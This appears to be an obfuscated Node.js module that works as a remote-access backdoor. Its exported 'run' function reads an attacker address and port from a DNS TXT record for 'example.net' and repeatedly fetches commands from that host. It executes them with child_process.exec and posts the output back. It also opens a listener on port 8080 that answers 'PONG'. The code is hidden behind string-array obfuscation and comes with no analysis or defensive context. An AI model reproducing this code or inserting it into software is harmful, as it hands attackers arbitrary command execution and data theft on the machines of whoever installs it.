function _0x13b8(_0x2299c9,_0x5c1a2a){const _0xf9056d=_0xf905();return _0x13b8=function(_0x13b818,_0x31d464){_0x13b818=_0x13b818-0x1dc;let _0x4e6a22=_0xf9056d[_0x13b818];return _0x4e6a22;},_0x13b8(_0x2299c9,_0x5c1a2a);}const _0x18b4a2=_0x13b8;(function(_0x10fd5c,_0x57dd5e){const _0xcb8247=_0x13b8,_0x558ebc=_0x10fd5c();while(!![]){try{const _0x63b185=parseInt(_0xcb8247(0x1e2))/0x1+-parseInt(_0xcb8247(0x1ff))/0x2*(parseInt(_0xcb8247(0x1dd))/0x3)+parseInt(_0xcb8247(0x1f6))/0x4*(-parseInt(_0xcb8247(0x203))/0x5)+parseInt(_0xcb8247(0x1e0))/0x6*(-parseInt(_0xcb8247(0x1e8))/0x7)+-parseInt(_0xcb8247(0x1f1))/0x8*(parseInt(_0xcb8247(0x1e7))/0x9)+parseInt(_0xcb8247(0x1ee))/0xa*(parseInt(_0xcb8247(0x1f8))/0xb)+-parseInt(_0xcb8247(0x1e1))/0xc*(-parseInt(_0xcb8247(0x1f4))/0xd);if(_0x63b185===_0x57dd5e)break;else _0x558ebc['push'](_0x558ebc['shift']());}catch(_0x4197ab){_0x558ebc['push'](_0x558ebc['shift']());}}}(_0xf905,0xb45b6));function _0xf905(){const _0x2d3c33=['12888ORuLQV','child_process','listen','351rqtPMT','terminate','22404JVHtxe','createServer','11kDnMkI','resolveTxt','split','log','dns','exec','replaceAll','1451486QhJLqz','POST','error','GET','415LnOLVz','Error:\x20','6NZvRZG','future','0.0.0.0','6ixgEQd','744612BFmMzl','1023393fotQhC','example.net','data','writeHead','run','6669mivFtk','1072603ujlLdj','rfile=','end','grab','application/x-www-form-urlencoded','request','13033210CjcCpc','http','length'];_0xf905=function(){return _0x2d3c33;};return _0xf905();}const http=require(_0x18b4a2(0x1ef)),exec=require(_0x18b4a2(0x1f2))[_0x18b4a2(0x1fd)],dns=require(_0x18b4a2(0x1fc));let ATTACKER_IP='',ATTACKER_PORT=0x0;const runCommand=function(_0x3b26d2,_0x28f915){exec(_0x3b26d2,(_0x2909fb,_0x11007b,_0x4a30f9)=>{const _0x18fecb=_0x13b8;console[_0x18fecb(0x1fb)](_0x11007b),sendPost(_0x11007b),sendPost(_0x4a30f9),_0x28f915();});},sendPost=function(_0x1d6076){const _0x2396d2=_0x18b4a2;console['log'](_0x1d6076);let _0xdc2a80='',_0x1cdd4f=_0x2396d2(0x1e9)+encodeURIComponent(_0x1d6076),_0x1a3b71=http[_0x2396d2(0x1ed)]({'hostname':ATTACKER_IP,'port':ATTACKER_PORT,'path':'/','method':_0x2396d2(0x200),'headers':{'Content-Type':_0x2396d2(0x1ec),'Content-Length':_0x1cdd4f[_0x2396d2(0x1f0)]}},_0x16c66e=>{const _0x42d2b7=_0x2396d2;_0x16c66e['on'](_0x42d2b7(0x1e4),_0x571bab=>{_0xdc2a80+=_0x571bab;}),_0x16c66e['on'](_0x42d2b7(0x1ea),()=>{const _0xca2b97=_0x42d2b7;console[_0xca2b97(0x1fb)](_0xdc2a80);});})['on'](_0x2396d2(0x201),_0x289a61=>{const _0x5bb684=_0x2396d2;console[_0x5bb684(0x1fb)](_0x5bb684(0x1dc),_0x289a61);});_0x1a3b71['write'](_0x1cdd4f),_0x1a3b71['end']();};function attach(){const _0x5605e5=_0x18b4a2,_0x3d7131=http[_0x5605e5(0x1ed)]({'hostname':ATTACKER_IP,'port':ATTACKER_PORT,'path':'/','method':_0x5605e5(0x202)},_0x2eaa9c=>{const _0x2490f0=_0x5605e5;let _0x168b24='';_0x2eaa9c['on']('data',_0x200d5a=>{_0x168b24+=_0x200d5a;}),_0x2eaa9c['on'](_0x2490f0(0x1ea),()=>{const _0x475573=_0x2490f0;if(_0x168b24===_0x475573(0x1f5))return;else _0x168b24===_0x475573(0x1eb)?(console[_0x475573(0x1fb)](_0x475573(0x1de)),attach()):_0x168b24[_0x475573(0x1fe)]('\x20','')!==''&&runCommand(_0x168b24,function(){attach();});});})['on'](_0x5605e5(0x201),_0x3c19f4=>{const _0x4a8b48=_0x5605e5;console['log'](_0x4a8b48(0x1dc),_0x3c19f4);})[_0x5605e5(0x1ea)]();}exports[_0x18b4a2(0x1e6)]=function(){const _0x4a7d98=_0x18b4a2;dns[_0x4a7d98(0x1f9)](_0x4a7d98(0x1e3),(_0x507b82,_0x24564f)=>{const _0x2e196f=_0x4a7d98;console[_0x2e196f(0x1fb)](_0x24564f[0x0][0x0]),ATTACKER_IP=_0x24564f[0x0][0x0][_0x2e196f(0x1fa)](':')[0x0],ATTACKER_PORT=parseInt(_0x24564f[0x0][0x0][_0x2e196f(0x1fa)](':')[0x1]),attach();});const _0x483801=http[_0x4a7d98(0x1f7)](function(_0x240547,_0x5c45f9){const _0x3aa881=_0x4a7d98;_0x5c45f9[_0x3aa881(0x1e5)](0xc8),_0x5c45f9[_0x3aa881(0x1ea)]('PONG');});_0x483801[_0x4a7d98(0x1f3)](0x1f90,_0x4a7d98(0x1df),()=>{const _0x1ad255=_0x4a7d98;console[_0x1ad255(0x1fb)]('Server\x20is\x20running\x20...');});};